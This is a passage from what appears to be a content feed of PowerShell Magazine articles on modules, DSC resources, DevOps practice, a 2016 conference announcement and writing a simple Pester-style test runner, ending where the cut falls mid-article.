PSBookmark Function Set-LocationBookmarkAsPWD 1.0.0 PSBookmark PS C:\\\u0026gt; Get-Command -Module PSBookmark -CommandType Alias CommandType Name Version Source ----------- ---- ------- ------ Alias glb -\u0026gt; Get-LocationBookmark 1.0.0 PSBookmark Alias goto -\u0026gt; Set-LocationBookmarkAsPWD 1.0.0 PSBookmark Alias rlb -\u0026gt; Remove-LocationBookmark 1.0.0 PSBookmark Alias save -\u0026gt; Save-LocationBookmark 1.0.0 PSBookmark Create a New Location Alias You can use the save command to save alias for either the PWD or a specific path.\n#This will save $PWD as scripts save scripts #This will save C:\\Documents as docs save docs C:\\Documents Jump or Goto a Saved Location Alias #You don\u0026#39;t have to type the alias name. Instead, you can just tab complete. This function uses dynamic parameters. goto docs Get All Saved Alias Locations PS C:\\\u0026gt; glb Name Value ---- ----- docs C:\\Documents oss C:\\Documents\\Github Remove a Saved Alias Location #You don\u0026#39;t have to type the alias name. Instead, you can just tab complete. This function uses dynamic parameters. rlb docs TODO  This was written in just a few minutes and did not spend any time polishing it. So, there is certainly scope for improvement. At the moment, the aliases are stored as a hash table in a .PS1 file in $env:UserProfile. This may change in future.  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2016/05/06/powershell-location-bookmark-for-easy-and-faster-navigation/","tags":["Modules"],"title":"PowerShell Location Bookmark for Easy and Faster Navigation"},{"categories":["How to"],"contents":"In the article Decoding PowerShell build numbers, I stated the need to have some form of reference to what the various PowerShell build numbers means:\nAs stated in that article, due to the new and fast moving pace Microsoft have gotten into, we will see more frequent updates to PowerShell than before. Version number is one element, another one which is not easy to keep track of as a regular PowerShell user is what commands are new or changed. For example, parameters might be added or removed from existing cmdlets.\nAt the time of this writing, a new technical preview of Windows Server 2016 has just been released. But how can you know what is changed with regards to PowerShell commands?\nThere are some code snippets available to compare changes between versions. For example, Shay Levy’s script listed in this article. Since the need to perform this task will occur more and more often going forward, I decided to turn this into a reusable function. The function is named Compare-PSVersionCommand and is available in the module PSVersionCompare. You can either get it directly from GitHub, or use PowerShellGet to install it from the PowerShell Gallery: Install-Module -Name PSVersionCompare\nIn the initial version, Compare-PSVersionCommand have two parameter sets which makes it possible to compare based on either XML-files pre-gathered from systems, or data gathered directly via PowerShell remoting:\n#Input gathered via PowerShell remoting Compare-PSVersionCommand -SourceVersionComputerName HPV-VM-2016TP4 -CompareVersionComputerName HPV-JR-2016TP5 -ModuleFilter Microsoft.* #Input from XML $PSCommandDataRoot = \u0026#39;C:\\Program Files\\WindowsPowerShell\\Modules\\PSVersionCompare\\PSCommandData\u0026#39; $SourceVersionPath = Join-Path -Path $PSCommandDataRoot -ChildPath \u0026#39;Microsoft Windows Server 2016 Datacenter Technical Preview 4_5.0.10586.0_Desktop.xml\u0026#39; $CompareVersionPath = Join-Path -Path $PSCommandDataRoot -ChildPath \u0026#39;Microsoft Windows Server 2016 Datacenter Technical Preview 5_5.1.14284.1000_Desktop.xml\u0026#39; Compare-PSVersionCommand -SourceVersionPath $SourceVersionPath -CompareVersionPath $CompareVersionPath -ModuleFilter Microsoft.* Here is an example which shows the differences in the native PowerShell modules between Windows Server 2016 Technical Preview 4 and Technical Preview 5:\nShowing changes for all commands in all modules is impractical in an article like this, so a .txt file containing all changes is available here.\nSame information for Windows Server 2016 Nano TP4-\u0026gt;TP5 (TXT-file), using PowerShell remoting as input:\nThe XML files specified are generated by running the following on systems running the versions you want to compare:\nGet-PSVersionCommand -ComputerName HPV-JR-2016TP5 -Export -Verbose If you run Get-PSVersionCommand without -Export, you will get all commands from system wide modules returned.\nAs you might know, there is a new $PSEdition variable (also exists in $PSVersionTable.PSEdition) introduced in the Windows Server 2016 Technical Previews. This is intended to distinguish PowerShell Core (used in Nano Server) from “regular PowerShell” called PowerShell Desktop. If -Path is not specified to Get-PSVersionCommand -Export, the default naming convention for the generated XML-file is “OS Caption_PSVersion_PSEdition.xml” (for example Microsoft Windows Server 2016 Datacenter Technical Preview 5_5.1.14284.1000_Core.xml).\nWhen creating reference XML-files for server operating systems, I like to make sure that all Remote Server Administration Tools (RSAT) is installed on the reference computers in order to have all modules available for comparison. This can be accomplished like this:\nGet-WindowsFeature -Name *RSAT* | Where-Object Installed -eq $false | Install-WindowsFeature There are a lot more features planned for this module, so check out the Git repository for the latest status (or run Update-Module -Name PSVersionCompare if you already installed it using PowerShellGet). Some of the planned features:\n A Name parameter for specifying what command to compare. If not specified, all commands will be compared. Options for output- formats, such as CSV, JSON, and HTML. Default output format is meant for interactive usage, not to export. An Online parameter for retrieving the XML files for the specified PS Versions from an online location. Defaults to the PSCommandData folder in the Git repository.  Although using PowerShell remoting for ad-hoc checking between two systems might be the most common scenario for using Compare-PSVersionCommand, the use of XML files should not be underestimated. If the community contributes with files to the PSCommandData folder in the Git-repository, over time we can gather a lot of information about commands in the different PowerShell versions making it easy to do comparisons without access to a system running a specific version.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2016/04/29/comparing-commands-between-powershell-versions/","tags":["How to"],"title":"Comparing commands between PowerShell versions"},{"categories":["PowerShell DSC"],"contents":"While at the PowerShell Conference EU, we had some very good discussions around PowerShell and PowerShell DSC. A few questions came up about DSC composite resources and how they are being used. DSC composite resources are essentially configurations packaged as resource modules. The benefit is that you can discover them like other DSC resource modules and use them like that. There is a good overview and information on authoring Composite resources on MSDN. So, if you are completely new to this concept, I suggest you read the article first before proceeding.\nTL;DR: If you already know about what DSC composite resources are and how they work, We would like to understand a few aspects around composite resources. Here is a small survey for you: https://www.surveymonkey.com/r/6K6FGTR.\nIn the following example, I am using the ServiceSet composite resource that comes with Windows Server 2016 TP4.\nInstead of specifying multiple instances of Service resource, we can use the ServiceSet to configure multiple services that need to be configured in a similar way. Here is an example of the configuration that uses ServiceSet composite resource.\nConfiguration DemoComposite { Import-DscResource -ModuleName PSDesiredStateConfiguration ServiceSet ServiceSetComposite { Name = \u0026#39;audiosrv\u0026#39;,\u0026#39;winmgmt\u0026#39; Ensure = \u0026#39;Present\u0026#39; } } DemoComposite -OutputPath C:\\DemoComposite Start-DscConfiguration -Path C:\\DemoComposite -Force -Wait -Verbose Once you enact this configuration and use the Get-DscConfiguration cmdlet, you will see that the ServiceSet resource gets expanded into the two Service resource instances defined in the configuration.\nPS C:\\\u0026gt; Get-DscConfiguration ConfigurationName : DemoComposite DependsOn : ModuleName : PSDesiredStateConfiguration ModuleVersion : 1.1 PsDscRunAsCredential : ResourceId : [Service]Resource0::[ServiceSet]ServiceSetComposite SourceInfo : BuiltInAccount : LocalService Credential : Dependencies : {AudioEndpointBuilder, RpcSs} Description : Manages audio for Windows-based programs. If this service is stopped, audio devices and effects will not function properly. If this service is disabled, any services that explicitly depend on it will fail to start DisplayName : Windows Audio Ensure : Name : audiosrv Path : C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted StartupType : Manual State : Running Status : PSComputerName : CimClassName : MSFT_ServiceResource ConfigurationName : DemoComposite DependsOn : ModuleName : PSDesiredStateConfiguration ModuleVersion : 1.1 PsDscRunAsCredential : ResourceId : [Service]Resource1::[ServiceSet]ServiceSetComposite SourceInfo : BuiltInAccount : LocalSystem Credential : Dependencies : {RPCSS} Description : Provides a common interface and object model to access management information about operating system, devices, applications and services. If this service is stopped, most Windows-based software will not function properly. If this service is disabled, any services that explicitly depend on it will fail to start. DisplayName : Windows Management Instrumentation Ensure : Name : winmgmt Path : C:\\Windows\\system32\\svchost.exe -k netsvcs StartupType : Automatic State : Running Status : PSComputerName : CimClassName : MSFT_ServiceResource Now, for some people, this may not make sense. In the configuration script, we have only one resource but in the Get-DscConfiguration output, we have two service instances. This can be confusing at times. The same applies to the Test-DscConfiguration cmdlet as well.\nPS C:\\\u0026gt; Test-DscConfiguration -Detailed | Select -ExpandProperty ResourcesInDesiredState ConfigurationName : DemoComposite DependsOn : ModuleName : PSDesiredStateConfiguration ModuleVersion : 1.1 PsDscRunAsCredential : ResourceId : [Service]Resource0::[ServiceSet]ServiceSetComposite SourceInfo : ::2::1::Service DurationInSeconds : 0 Error : FinalState : InDesiredState : True InitialState : InstanceName : Resource0::[ServiceSet]ServiceSetComposite RebootRequested : False ResourceName : Service StartDate : 4/22/2016 6:50:41 PM PSComputerName : localhost ConfigurationName : DemoComposite DependsOn : ModuleName : PSDesiredStateConfiguration ModuleVersion : 1.1 PsDscRunAsCredential : ResourceId : [Service]Resource1::[ServiceSet]ServiceSetComposite SourceInfo : ::8::1::Service DurationInSeconds : 0.015 Error : FinalState : InDesiredState : True InitialState : InstanceName : Resource1::[ServiceSet]ServiceSetComposite RebootRequested : False ResourceName : Service StartDate : 4/22/2016 6:50:41 PM PSComputerName : localhost You can identify the resource instances that belong to the composite resource configuration using the InstanceName property. However, it is not always desired.\nInstead of this expansion, it will be helpful if the Get and Test methods roll-up the status of the resource instances from the composite resource configuration into a single instance.\nSo, here is a survey for you. Vote it up and let the team know what your preference is.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2016/04/22/survey-powershell-dsc-composite-resources/","tags":["PowerShell DSC"],"title":"Survey: PowerShell DSC Composite Resources"},{"categories":["How to"],"contents":"There are several ways to determine what version of Windows PowerShell you are running on a computer. The most common technique is to use the $PSVersionTable automatic variable:\nHere, we can see the PowerShell version number in the PSVersion property.\nUntil PowerShell 5.0 was released as part of Windows Management Framework 5.0, the build number was rounded to .0, such as 1.0, 2.0, 3.0, and 4.0. However, in this new and fast moving pace Microsoft have gotten into, we will see more frequent updates to PowerShell than before. Due to this, the PowerShell version number isn’t simply 5.0 anymore as you might have expected. Now it’s a full build number, such as 5.0.10586.117 for the RTM release of Windows Management Framework 5 for downlevel operating systems.\nIf you are used to testing preview build of the Windows Management Framework in earlier versions, you might be familiar with the notion of build numbers. However, it’s getting harder to keep track of what build number maps to what version of PowerShell. For example, is 5.0.10586.51 a preview version or an RTM version? Without any form of mapping information, it’s very difficult to know.\nBecause of this difficulty, I decided to create PowerShell function which can read a mapping table and convert the PSVersion property to a “PSFriendlyVersionName” which makes more sense to a user. Here you can see Get-PSVersion in action:\nThe function is reading a JSON file where the mapping information is defined:\nSince Microsoft does not provide any PowerShell build number reference, it is up to us – the community – to maintain this mapping information. I have added the RTM build numbers down to version 2 (it does not make sense to add version 1, since PowerShell Remoting which the function leverages was introduced in version 2), but there are a lot of build numbers for preview versions to add.\nI have put both the Get-PSVersion function and the JSON file in a PowerShell module, in order to make it easy to download from the PowerShell Gallery. This means you can simply type Install-Module -Name PSVersion to install it directly from the gallery. Or, you can of course use Save-Module first if you want to inspect the content before installing it. The module is also available on my GitHub account, where you can fork it and send a pull request if you have any contributions to either the Get-PSVersion function or the JSON mapping file. I have also created a TechNet Wiki site called Windows PowerShell build numbers as a reference for those who don`t want to leverage the PSVersion module.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2016/03/10/decoding-powershell-build-numbers/","tags":["How to"],"title":"Decoding PowerShell build numbers"},{"categories":["How To","VS Code"],"contents":"Visual Studio Code is a free code editor redefined and optimized for building and debugging modern web and cloud applications.\nIt supports extensions for adding additional languages, themes, debuggers, commands, and more.\nAs you might notice in the above image, one of the extensions is a PowerShell extension. The extension provides PowerShell language support including syntax highlighting, code snippets, IntelliSense, code navigation, real-time script analysis, and local script debugging. More information and installation instructions can be found in this article on the PowerShell Team blog.\nEarlier this month I reached out to David Wilson, a software engineer in the PowerShell team at Microsoft, to ask the following question:\nMicrosoft MVP Doug Finke also reached out to me to ask whether I was going forward with adding that feature to the extension. Thanks to him and David I got the jumpstart I needed to begin creating\nIt did require some knowledge of TypeScript, which is a typed superset of JavaScript that compiles to plain JavaScript. As I’ve never work with any other languages than those related to “admin-scripting”, this was new ground for me. Although I found it very interesting to look into something new, and a lot of concepts I’m used to from working with PowerShell could be leveraged.\nAfter spending a few evenings working on it, as well as getting very fast and great support from David and Doug along the road, I got the extension working as I had hoped.\nThe PowerShell extension for Visual Studio Code is hosted on GitHub, so I started by forking my own copy of the repository. A good practice when working with Git (or any other source control system for that matter), is to create a new branch when developing new features. The dedicated branch can then be merged into the master branch and a pull request can be sent to the original repository in order to get the new feature added to the product.\nAfter forking the original repository I created a new branch in my fork called OpenInISE, where I started working on the implementation.\nThe implementation is added to multiple files in the Visual Studio Code PowerShell Extension repository:\nPackage.json on line 60-62:\nThis is creating a so called key binding, so that the command PowerShell.OpenInIse is triggered when the editor is focusing on text and the current language ID is PowerShell (which is automatic when opening ps1/psd1/psm1-files).\nNext in the same file (Package.json), the following is defined on line 82-84:\nIn main.ts on line 15, the command is imported from a sub-directory:\nOn line 105 in main.ts the OpenInIseCommand is registered:\nThe feature itself is defined in OpenInISE.ts:\nIn the same way you test code when developing for example a PowerShell script, you need to test it when doing changes. In Visual Studio Code, which I used as an editor when writing this, the recommended workflow I got from David was the following:\n From your PowerShell console in the vscode-powershell directory, type code –extensionDevelopmentPath=”c:\\your\\path\\to\\vscode-powershell” . A development version of VS Code will appear with your current code loaded. Type npm install. (Author’s note: Npm is the default package manager for the JavaScript runtime environment Node.js) Type npm run compile. This will build the code and wait for any further file saves then it will recompile again. When you make changes to the code you can press the Ctrl+R hotkey to have VS Code reload itself and pick up any changes you made to the code after they are recompiled In your code, you can temporarily call showInformationMessage to make some text appear at the top of the VS Code screen. This might be helpful for seeing the state of your variables while you’re working out the details of the function.  This worked well for me, but since I didn’t have any experience in this area I missed a basic pre-requisite which was to install node.js:\nNode.js is an open-source, cross-platform runtime environment for developing server-side web applications. Node.js applications are written in JavaScript and can be run within the Node.js runtime on a wide variety of platforms\nI downloaded and installed version 5.4.0 from https://nodejs.org/en, and after that the suggested workflow worked as expected.\nWhen the extension was finished, tested, and reviewed by David and Doug I submitted a pull request which was accepted:\nThe new command is available in version 0.4.0 of the PowerShell extension for Visual Studio Code, which was released February 8, 2016. After you have upgraded to that version, you can enter Ctrl+Shift+I to open PowerShell files in PowerShell ISE.\nPersonally I find myself using Visual Studio Code more and more when working on larger PowerShell artifacts, such as repositories for PowerShell Desired State Configuration resources. It’s very fast and easy to use when you need a quick overview of a repository, as well as to make changes. When testing scripts still prefer to use PowerShell ISE, hence the request for an Open in ISE extension.\nI hope this introduction to adding new capabilities to the Visual Studio Code PowerShell extension was useful, and that you may have gotten the curiosity to try it out for yourself.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2016/02/10/how-to-add-a-new-functionality-to-the-visual-studio-code-powershell-extension/","tags":["How To","VS Code"],"title":"How to add a new functionality to the Visual Studio Code PowerShell extension"},{"categories":["News"],"contents":"PowerShell is not just a simple little script automation language anymore. It has transitioned into true DNA for Microsoft server technology, and with workflows and DSC forms the platform for “infrastructure as code”. And there is so much more. Pester tests, JEA role based security, PowerShellGet central code repositories – the PowerShell feature set rapidly expands, and sometimes it’s hard to keep track.\nThere are not many places where you can get a hold of exceptional PowerShell experts that bring you up to speed with straight-forward presentations, great examples, and who are there to take your questions. One very special place like this is Hanover, Germany. In April 20-22, Hanover hosts the first “PowerShell Conference EU”, and what a debut this is.\nWith more than 30 speakers and 60+ sessions, the conference literally burns a fireworks of latest PowerShell technology sessions. Administering Nano servers, attacking Active Directory, defending with JEA, optimizing SQL and utilizing PowerShell forensics are just some of the many sessions. You get up to five parallel tracks to choose from. And it’s not just presentation. It’s learning and communicating. With breakout sessions, room for discussion, speaker panels, and of course an awesome evening event.\nThe Psconf.eu organizers love paradigms and pictures. 2016 is not just the 10th PowerShell anniversary. It’s also Leibniz year in Hanover, and Leibniz invented the “Monadology” more than 300 years ago. PowerShell inventor Jeffrey Snover was inspired by Leibniz when he created his vision of PowerShell, and guess what? Jeffrey Snover in person will open the conference together with organizer Tobias Weltner. Weltner and Snover tour the different PowerShell versions and highlight all the significant features in the different versions, chatting about Snovers motifs, and showing how PowerShell has evolved (and why). This keynote is the perfect primer for anyone wanting to fully understand the PowerShell ecosystem, plus serves as a great start for all the specialty sessions following.\nAnd there are more paradigms. The evening event takes place in Yukon Bay, an old gold digger town in the center of Hannover Zoo. Psconf.eu rented the entire place, so delegates can decelerate and get together while enjoying great food and drinks. Yukon Bay – Gold digger town – dig it? Think “nugget”, NuGet, PowerShell Get.\nDay 2 and 3 shift focus. The conference moves to its own section of the Hanover congress center, with 4 main track rooms and 8 breakout session rooms. Now the creative part becomes more intense. Smaller groups, discussions, hands-on demos, and the chance to hijack experts after sessions and do your own whiteboard sessions with them. Talking about experts: Bruce Payette is there, of course, too! You may know his book “PowerShell in Action”. Bruce is also part of the PowerShell team and has significantly shaped the PowerShell language.\nBy the end of day 2, user groups get a chance to present themselves, plus share experience and tips with anyone ever wanting to open up their own local script club. It’s then the perfect time to peer up and form groups, and head out to some of Hanovers “gemütliche” beer bars. We provide you with a great selection of recommended bars. The rest is up to you.\nJust make sure you are back and sober by 9am the next day for a third round of exciting sessions and renowned speakers: Security experts Jared Atkinson and Will Harmjoy, who created PowerShell Empire. ISESteroids inventor and author of powershell.com’s daily PowerShell tips, Tobias Weltner. Aleksandar Nikolic, Ravikanth Chaganti, and Bartek Bielawski from powershellmagazine.com. SQL wizard Chrissy LeMaire, Jaap Brasser, June Blender, Jeff Wouters, uh you name it, so many more, a truly exceptional speaker lineup. I’d recommend you just head over to www.psconf.eu and have a look for yourself. The agenda is up. And there’s probably no better place to meet them all.\nJust don’t wait too long. Seats are limited. Plus, hotel rooms tend to become limited (and expensive) over time, too. This is a non-profit PowerShell fiesta, all organizers and speakers volunteer. Your EUR 840 admission (EUR 999 with VAT included) pays the rest and includes all three conference days, food and drinks, plus the evening event.\nWith the new 4-track concept, there is room for 200 delegates now. More than half of the seats are gone already. So get up and register!\nLooking forward to seeing you in Hannover in April!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2016/01/12/powershell-conference-europe-speakers-and-sessions/","tags":["News","Conferences"],"title":"PowerShell Conference Europe Speakers and Sessions"},{"categories":["Articles","DevOps","PowerShell DSC"],"contents":"DevOps is the new cool thing (at least in the Windows world) everyone is talking about and the IT professionals (some of us at least) just give a blank stare every time the DevOps discussion comes up. We feel completely out of place. IT professionals are a part of the DevOps practices and not outside of it. With the rise of web-scale infrastructures, it is important for IT organizations to be more agile and efficient to support the ever growing need for flexible infrastructures than a normal IT professional would have ever imagined. This article series intends to shed some light on DevOps and what it really means for the IT professionals like you and me, and finally explains how and where PowerShell Desired State Configuration plays a role. Let us start with the most trusted definition of DevOps:\n DevOps (a clipped compound of development and operations) is a culture, movement or practice that emphasizes the collaboration and communication of both software developers and other information-technology (IT) professionals while automating the process of software delivery and infrastructure changes. It aims at establishing a culture and environment where building, testing, and releasing software, can happen rapidly, frequently, and more reliably.\n Let us keep the collaboration and communication part of this definition out of our discussion here. It is more of a soft-skill and a practice that should be nurtured between the development and operations teams. There are even tools that enforce this communication and collaboration. Let us focus on later parts the DevOps definition that is about automating the process of software delivery and infrastructure changes and building, testing, and releasing software rapidly, frequently, and more reliably. A picture is worth a thousand words. So, here is the technical part of the DevOps definition in a picture!\nWhat this picture depicts is the typical application code flow from development to production. The phases such as continuous integration and continuous delivery ensure that the developed application code is tested and is stable for deployment in production. The tests that run at these phases provide an assurance that the code will run as expected in all sorts of environments (Development, QA, Staging, and Production) where the code gets deployed. One thing you must note here is that for the application code to run as expected in any of the environments, you must have the same or similar infrastructure configuration. For example, when you start making changes to the application code, the development infrastructure where you perform unit testing of your code must mimic production infrastructure. If the application code in development requires infrastructure configuration changes, these configuration changes must move, along with the application code, from development to other environments as the code gets tested and deployed.\nWhile delivering and deploying the application code in a rapid and efficient manner is important, it is equally important to ensure that the infrastructure where this code gets deployed is dealt the same way we deal with the application code. For reusable, consistent, and rapid deployments of infrastructure, you need automation. When you have automation, you always want to validate what you are doing because there are no humans sitting and watching the deployment as it happens or to click buttons to complete the deployment. And, finally, when something goes wrong, you want to quickly see what changed in your infrastructure automation and rollback those changes when needed.\nThis is where infrastructure as code comes into picture!\nInfrastructure as Code It is easy to argue that what I just described is infrastructure automation which you and I as IT professionals have been doing for ages. Right? One thing you must notice here is that infrastructure as code is not just about code alone. Infrastructure automation does play a role within infrastructure as code. After all, how else do we create reusable and repeatable infrastructure without automation. Infrastructure as code mandates software development practices in managing IT infrastructure.\nThe three major components of infrastructure as code are:\n Version Control – Enables the method track and rollback changes to your infrastructure as needed. There are many tools that you can use here. My favorite has been Git. If you are new to version control and want to get started, take a look at my Git for IT Professionals Unit/Integration Testing – Enables validation of your infrastructure code within various phases of DevOps pipeline and lets you feel confident about what you are pushing to production. Pester can be used here. We have great series on getting started with Pester. Infrastructure Blueprints – Enable consistent, reusable, and rapid deployment part of infrastructure as code. Configuration as Code is one of the ways to create infrastructure blueprints but not the only option. Tools like Puppet, Chef, and a platform like PowerShell DSC enable Configuration as Code. These configuration management tools or platforms basically enable declarative way of handling infrastructure configuration. Infrastructure blueprints should always go hand-in-hand with unit/integration testing. We will see more about this in a later post.  Since the first two parts of infrastructure as code are already discussed in other article series here on PowerShell Magazine, I will only focus on infrastructure blueprints that enable consistent, reusable, and rapid deployment and what role PowerShell DSC plays in this space. When I say consistent, I don’t mean that the host names and IP addresses should be the same. Rather, the configuration aspects that impact the application behavior should be the same. This can only be achieved if there is a reusable method to repeatedly deploy this infrastructure in any environment – be it Development, QA, Staging, or Production. You need the ability to separate your environmental configuration from the resource configuration to be able to create a reusable deployment method that works across different environments. For example, the IP addresses and hostnames will be different within each environment. The number of frontend VMs that you would run in a staging environment would be different than the number of VMs in production. Once this level of separation is available, you can create a single blueprint for your infrastructure and then reuse it in any environment just by specifying the right environmental configuration. This is where Puppet, Chef, PowerShell DSC, and other configuration management solutions play a role.\nPowerShell DSC First of all, understand that PowerShell DSC is not Infrastructure as Code. It is one of the enablers of infrastructure as code. I mentioned configuration as code and that is where PowerShell DSC comes into play. It enables a declarative way of expressing your infrastructure configuration. Using this declarative syntax, you can create what I referred to as infrastructure blueprints in the previous section. PowerShell DSC supports separation of environmental configuration from structural or resource configuration. You can use the configuration data in your DSC documents to make your infrastructure blueprints reusable. To ensure that your infrastructure blueprints can be deployed in a repeatable and reliable manner, you need unit and integration tests once the deployment is complete. You can use Pester for this purpose. We shall look at using PowerShell DSC as a part of infrastructure as code in-depth in later parts of this series.\nIn summary, as an IT professional, it is important for you to know what DevOps brings to enterprise data centers and the difference between infrastructure automation and infrastructure as code. This means you transform yourself from an Infrastructure Professional to an Infrastructure Developer.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2016/01/05/devops-infrastructure-as-code-and-powershell-dsc-the-introduction/","tags":["DevOps","PowerShell DSC"],"title":"DevOps, Infrastructure as Code, and PowerShell DSC: The Introduction"},{"categories":["PowerShell DSC","Hyper-V"],"contents":"Earlier this year, I released a bunch of DSC resources packaged as cHyper-V resource module. The resources are focused on configuring Hyper-V networking. For example, you can use the resources in the cHyper-V module to configure a converged network switch on Hyper-V. These resources have been very handy for me and I built and re-built a few Hyper-V clusters with a lot of ease.\nWith the Server 2016 TP4 release, I wanted to take advantage of DSC as build my test labs. So, I wrote a couple of DSC resources and added to the cHyper-V resource module.\nSwitch Embedded Teaming (SET) With Windows Server 2016, there is a new networking feature called Switch Embedded Teaming (SET). In the older method of creating a converged network, we created a native network team and then used that for VM switch. With SET, we can create a team of network adapters (up to 8) embedded within the virtual switch.\nThis graphical representation of SET, from TechNet, should be helpful in understanding what needs to be achieved.\nUsing this DSC resource for creating Switch Embedded Teaming (SET) is straightforward. The following screenshot shows the available resource properties.\nHere is the sample configuration that shows how to use the resource.\nConfiguration DemoSET { Import-DscResource -ModuleName cHyper-V -Name cSwitchEmbeddedTeam, cVMNetworkAdapter cSwitchEmbeddedTeam DemoSETteam { Name = \u0026#39;MySetTeam\u0026#39; NetAdapterName = \u0026#39;NIC1\u0026#39;,\u0026#39;NIC2\u0026#39; AllowManagementOS = $true Ensure = \u0026#39;Present\u0026#39; } cVMNetworkAdapter TestNet { Name = \u0026#39;DemoAdapter\u0026#39; SwitchName = \u0026#39;MySetTeam\u0026#39; ManagementOS = $true Ensure = \u0026#39;Present\u0026#39; DependsOn = \u0026#34;[cSwitchEmbeddedTeam]DemoSETteam\u0026#34; } } This is all you need to do. All members that should be a part of SET can be listed as a value of the NetAdapterName property. Setting AllowManagementOS to $true in the SET configuration creates an adapter in the management OS. The cVMNetworkAdapter is an option configuration. It is not required unless you want to add a second adapter to the management OS that is connected to the SET.\nNAT switch Configuration Starting with Server 2016 TP4, you can create a new VM switch type called NAT switch. This is mostly meant for container scenarios but there is nothing limiting you from taking advantage of this in a scenario that requires private connectivity within the VMs but needs external access for connecting to public Internet. This switch configuration is very simple and I wrapped up those steps in a DSC resource module.\nThe _Name _property identifies the name of the VM switch and the NATSubnetAddress properties identifies the address range that should be used for NATing.\nHere is how you use this resource.\nConfiguration NatDemo { Import-DscResource -ModuleName cHyper-V -Name cNatSwitch cNatSwitch NatDemo { Name = \u0026#39;SQLNatConfig\u0026#39; NATSubnetAddress = \u0026#39;192.168.0.0/24\u0026#39; Ensure = \u0026#39;Present\u0026#39; } } Looks like there are issues with the NAT switch configuration and NAT configuration overall. They don’t seem to be cleaning up well when we remove the configuration. So, you may find that using the same name or subnet address values for the switch creating multiple times will fail.\nYou can get these resource modules directly from my Github repository or from the PowerShell Gallery.\nGo ahead and try these new resources. Feel free to create any bug report or feature requests as needed.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/12/07/dsc-resource-to-configure-switch-embedded-teaming-in-windows-server-2016/","tags":["Hyper-V","PowerShell DSC"],"title":"PowerShell DSC Resources to Configure Switch Embedded Teaming and NAT Switch in Windows Server 2016"},{"categories":["DevOps","Pester"],"contents":"This article is a part of a larger series on Pester.\nLast time, we looked at how assertions work in theory, and how they are implemented in Pester. This gave us the foundation to understand how tests are failed, but in order to fail a test we first need to run it. So this time we will have a closer look at It, Context, and Describe and will create our own Test runner.\nPoor man’s test runner In the simplest case, you do not need much to run test script code. Actually, we already did it in the first article where we tested our Assert-Equal assertion.\nfunction Assert-Equal ($Expected, $Actual) { if ($Actual -ne $Expected) { throw \u0026#34;Value \u0026#39;$Expected\u0026#39; was expected, but was \u0026#39;$Actual\u0026#39;\u0026#34; } } $expected = 8 $actual = 4 Assert-Equal -actual $actual -expected $expected We simply take a piece of code and wait for it to fail or pass. So technically, we do not need a test runner, but it makes our lives a lot easier. It takes care of looking up all tests in a test suite, shows a nicely colored and formatted output, and enables us to organize our tests a little better.\nMaking our own test runner The main reason to have a test runner, though, is to be able to run all tests in the test suite even if some of them fail. To be able to do that we need to catch any exception and translate it to textual output or some other harmless type of output.\nIn the Assert-Throw assertion, we already did something very similar. We captured an exception so the user could not see it. To do that we used a try-catch block and wrapped it in a function like this:\nfunction Assert-Throw ([ScriptBlock]$ScriptBlock) { $exceptionWasThrown = $False try { \u0026amp;$ScriptBlock } catch { $exceptionWasThrown = $True } if (-not $exceptionWasThrown) { throw \u0026#39;Expected an exception to be thrown but no exception was thrown.\u0026#39; } } We are going to use a very similar approach for our test runner. Only this time we will output the exception that we captured, and we will output name of the current test as well:\nfunction Test-Case ([String]$Name, [ScriptBlock]$ScriptBlock) { try { \u0026amp;$ScriptBlock Write-Host -ForegroundColor Green \u0026#34;${Name}: Test passed.\u0026#34; } catch [Exception] { Write-Host -ForegroundColor Red \u0026#34;${Name}: Test failed because $_\u0026#34; } } In the Test-Case function we are taking a piece of code wrapped in a ScriptBlock. We execute this code using the \u0026amp; invocation operator and wait for it to either succeed or fail. By failing, we specifically mean that an exception was thrown. When an exception is thrown, for example by an assertion function, the code jumps inside of the catch block and outputs a red message to screen to notify us that the test code failed.\nIf no exception is thrown the code will write a green message, that lets us know that our code did not fail, which means that our test passed.\nCreate a suite of tests Now we are ready to take what we learned so far and create a suite of two tests:\nfunction Assert-Equal ($Expected, $Actual) { if ($Actual -ne $Expected) { throw \u0026#34;Value \u0026#39;$Expected\u0026#39; was expected, but was \u0026#39;$Actual\u0026#39;\u0026#34; } } function Test-Case ([String]$Name, [ScriptBlock]$ScriptBlock) { try { \u0026amp;$ScriptBlock Write-Host -ForegroundColor Green \u0026#34;${Name}: Test passed.\u0026#34; } catch [Exception] { Write-Host -ForegroundColor Red \u0026#34;${Name}: Test failed because $_\u0026#34; } } Test-Case \u0026#34;Eight is four\u0026#34; { $expected = 8 $actual = 4 Assert-Equal -actual $actual -expected $expected } Test-Case \u0026#34;Ten is ten\u0026#34; { $expected = 10 $actual = 10 Assert-Equal -actual $actual -expected $expected } Which outputs:\nEight is four: Test failed because Value \u0026#39;8\u0026#39; was expected, but was \u0026#39;4\u0026#39; Ten is ten: Test passed. Pay attention to the output. You can see that both tests run even though the first test failed. We just created our own test runner!\nIt The Test-Case function is roughly equivalent to the “It” function of Pester. “It” hosts a single test and prevents any failed test from failing the whole suite.\nThe actual implementation of It is riddled with input validation, testing the framework state, skipping tests, making them pending and so on, but the basic idea is still the same. Look at the implementation of Invoke-Test function and you will find the familiar pattern.\n$errorRecord = $null try { Invoke-TestCaseSetupBlocks do { $null = \u0026amp; $ScriptBlock @Parameters } until ($true) } catch { $errorRecord = $_ } finally { ... } $result = Get-PesterResult -ErrorRecord $errorRecord More interesting bits of It There are few more interesting bits in Pester’s It function. Those are not important to understanding the framework as a whole, but the It function implements so much that I feel obligated to describe at least some of those.\n Any output of the ScriptBlock is assigned to $null, which simply means that the output is discarded. The script invocation is placed inside of a single-iteration “do until” loop. The code in this loop will only run once, and so the loop looks useless, but the opposite is true. When the “break” keyword is used in test code without any surrounding loop, it would jump outside of the “It” block and would make the test suite fail unexpectedly. To prevent this a 